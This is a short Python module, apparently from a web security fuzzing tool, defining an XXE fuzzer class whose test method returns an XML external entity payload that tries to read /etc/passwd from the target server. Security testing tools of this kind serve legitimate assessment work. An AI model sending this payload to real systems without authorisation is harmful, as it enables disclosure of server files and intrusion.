#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XXE(Fuzzer):

    @staticmethod
    def test(self):
        return '''<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd" > %xxe; ]>'''
